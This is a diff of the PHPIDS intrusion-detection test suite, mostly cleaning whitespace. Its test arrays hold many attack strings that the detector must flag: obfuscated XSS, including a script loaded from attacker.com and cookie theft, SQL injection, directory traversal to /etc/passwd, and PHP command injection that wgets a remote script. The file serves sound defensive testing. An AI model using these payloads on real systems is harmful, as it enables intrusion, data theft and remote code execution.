@@ -1,4 +1,4 @@
-alt nur<?php
+<?php
 
 /**
  * PHPIDS
@@ -39,11 +39,11 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             array('user' => 'admin<script/src=http/attacker.com>'),
             $this->init,
             array('csrf')
-        );        
+        );
         $test->setHtml('test1');
         $this->assertEquals(array('test1'), $test->getHtml());
     }
-    
+
     public function testRunWithTags() {
         $test = new IDS_Monitor(
             array('user' => 'admin<script/src=http/attacker.com>'),
@@ -185,7 +185,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = '"\' onerror = alert(1) ';
         $exploits[] = '" a "" b="x"';
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -202,7 +202,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = 'test#';
         $exploits[] = '<!-- test -->';
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -267,7 +267,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                         x(x(\'nam\'+$)+$)';
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -361,7 +361,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "$$$[0] = !1-1 ? 'eva' : 0
 
                         $$$[1] = !1-1 ? 'l' : 0
-                        
+
                         $$$['\jo\in']([])";
         $exploits[] = 'x=/eva/i[-1]
                         $y=/nam/i[-1]
@@ -387,7 +387,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = '1[<t>__par{new Array}ent__</t>][<t>al{new Array}ert</t>](1) ';
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -408,7 +408,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "s1=<s>evalalerta(1)a</s>; s2=<s></s>+''; s3=s1+s2; e1=/s1/?s3[0]:s1; e2=/s1/?s3[1]:s1; e3=/s1/?s3[2]:s1; e4=/s1/?s3[3]:s1; e=/s1/?.0[e1+e2+e3+e4]:s1; a1=/s1/?s3[4]:s1; a2=/s1/?s3[5]:s1; a3=/s1/?s3[6]:s1; a4=/s1/?s3[7]:s1; a5=/s1/?s3[8]:s1; a6=/s1/?s3[10]:s1; a7=/s1/?s3[11]:s1; a8=/s1/?s3[12]:s1; a=a1+a2+a3+a4+a5+a6+a7+a8;e(a)";
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -464,9 +464,9 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "onabort=onblur=onchange=onclick=ondblclick=onerror=onfocus=onkeydown=onkeypress=onkeyup=onload=onmousedown=onmousemove=onmouseout=onmouseover=onmouseup=onreset=onresize=onselect=onsubmit=onunload=alert";
         $exploits[] = 'onload=1&&alert';
         $exploits[] = 'Q27Q2balertQ28documentQ2ecookieQ29Q2bQ27';
-        
+
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -502,7 +502,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "switch('foo bar foo bar foo bar') {case eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array):}";
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -551,7 +551,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "aa' XOR- column != -'0";
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -610,7 +610,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "1' -1 or '1";
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -654,7 +654,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "'+COALESCE('admin') and 1 =+1 = !true div @@version+'";
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -714,7 +714,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "a' or~column like ~1|'1";
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -790,17 +790,17 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "'or not false #aa";
         $exploits[] = "1' * id - '0";
         $exploits[] = "1' *id-'0";
-        
+
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
         );
         $result = $test->run();
         $this->assertEquals(821, $result->getImpact());
-    }    
-    
+    }
+
     public function testDTList(){
 
         $test1 = '../../etc/passwd';
@@ -843,7 +843,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = $test11;
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -863,7 +863,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = 'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat';
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -923,9 +923,9 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                         $_a[0](!a. "ls");  //';
         $exploits[] = '; e|$a=&$_GET; 0|$b=!a .$a[b];$a[a](`$b`);//';
         $exploits[] = 'aaaa { $ {`wget hxxp://example.com/x.php`}}';
-        
+
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -943,15 +943,15 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = 'XSS without being noticed<a/href=da&#x74&#97:text/html&#59&#x63harset=UTF-7&#44+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAPAAvAHMAYwByAGkAcAB0AD4->test';
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
         );
         $result = $test->run();
         $this->assertEquals(73, $result->getImpact());
-    }    
-    
+    }
+
     public function testBase64CCConverter() {
 
         $exploits = array();
@@ -961,23 +961,23 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = '<applet src="data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4" type=text/html>';
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
         );
         $result = $test->run();
         $this->assertEquals(105, $result->getImpact());
-    }    
-    
+    }
+
     public function testDecimalCCConverter() {
 
         $exploits = array();
         $exploits[] = '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;';
         $exploits[] = '60,115,99,114,105,112,116,62,97,108,100+1,114,116,40,49,41,60,47,115,99,114,105,112,116,62';
-        
+
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -999,7 +999,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits = array();
         $exploits[] = $test1;
         $exploits[] = $test2;
-        
+
         $this->_testForPlainEvent($exploits);
 
         $test = new IDS_Monitor(
@@ -1009,7 +1009,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $result = $test->run();
         $this->assertEquals(48, $result->getImpact());
     }
-    
+
     public function testHexCCConverter() {
         $test1 = '&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29';
         $test2 = ';&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3e;&#x20;&#x0a;&#x2f;&#x2f;&#x20;&#x43;&#x72;&#x65;&#x61;&#x6d;&#x6f;&#x73;&#x20;&#x6c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x65;&#x20;&#x0a;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x20;&#x29;&#x20;&#x7b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#xfa;&#x62;&#x6c;&#x69;&#x63;&#x6f;&#x20;&#x69;&#x6e;&#x69;&#x63;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x64;&#x6f;&#x20;&#x61;&#x20;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x20;&#x0a;&#x20;&#x74;&#x68;&#x69;&#x73;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x27;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x64;&#x6f;&#x20;&#x70;&#x61;&#x72;&#x61;&#x20;&#x65;&#x6c;&#x20;&#x6f;&#x62;&#x6a;&#x65;&#x74;&#x6f;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x20;&#x0a;&#x20;&#x76;&#x61;&#x72;&#x20;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x2e;&#x2e;&#x2e;&#x20;&#x0a;&#x7d;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x29;&#x3b;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x70;&#x72;&#x6f;&#x67;&#x72;&#x61;&#x6d;&#x61;&#x63;&#x69;&#x6f;&#x6e;&#x77;&#x65;&#x62;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x27;&#x3b;&#x20;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x20;&#x0a;&#x20;';
@@ -1032,7 +1032,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = $test3;
         $exploits[] = $test4;
         $exploits[] = $test5;
-        
+
         $this->_testForPlainEvent($exploits);
 
         $test = new IDS_Monitor(
@@ -1051,7 +1051,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "*))));";
 
         $this->_testForPlainEvent($exploits);
-        
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
@@ -1086,7 +1086,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits['html_7'] = '<img src src src src=x onerror=alert(1)>';
         $exploits['html_8'] = '<img src=1 onerror=alert(1) alt=1>';
         $exploits['html_8'] = '<b>\' OR 1=1-</b>-';
-        
+
         $this->init->config['General']['HTML_Purifier_Cache'] = dirname(__FILE__) . '/../../lib/IDS/tmp/';
         $test = new IDS_Monitor(
             $exploits,
@@ -1095,9 +1095,9 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $test->setHtml(array_keys($exploits));
         $result = $test->run();
         $this->assertFalse($result->hasEvent(1));
-        $this->assertEquals(162, $result->getImpact());  	
+        $this->assertEquals(162, $result->getImpact());
     }
-    
+
     public function testAllowedHTMLScanningNegative() {
         $exploits = array();
         $exploits['html_1'] = '<a href="http://www.google.de/">Google</a>';
@@ -1122,7 +1122,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                                 <h1><a href="http://php-ids.org/">PHPIDS » Web Application Security 2.0</a></h1>
                                 <div class="description"></div>
                                 </div></div><hr />';
-        
+
         $this->init->config['General']['HTML_Purifier_Cache'] = dirname(__FILE__) . '/../../lib/IDS/tmp/';
         $test = new IDS_Monitor(
             $exploits,
@@ -1131,9 +1131,9 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $test->setHtml(array_keys($exploits));
         $result = $test->run();
         $this->assertFalse($result->hasEvent(1));
-        $this->assertEquals(0, $result->getImpact());   
-    }    
-    
+        $this->assertEquals(0, $result->getImpact());
+    }
+
     public function testForFalseAlerts() {
 
         $exploits = array();
@@ -1184,31 +1184,31 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        
+
         $this->assertFalse($result->hasEvent(1));
         $this->assertEquals(0, $result->getImpact());
     }
-    
+
     /**
-     * This method checks for the plain event of every single 
+     * This method checks for the plain event of every single
      * exploit array item
      *
      * @access private
      * @param  array $exploits
      */
     private function _testForPlainEvent($exploits = array()) {
-        
+
         foreach($exploits as $exploit) {
             $test = new IDS_Monitor(
                 array('test' => $exploit),
                 $this->init
             );
             $result = $test->run();
-            
+
             if($result->getImpact() === 0) {
                 echo "\n\nNot detected: ".$exploit."\n\n";
             }
             $this->assertTrue($result->getImpact() > 0);
-        }    	
+        }
     }
 }
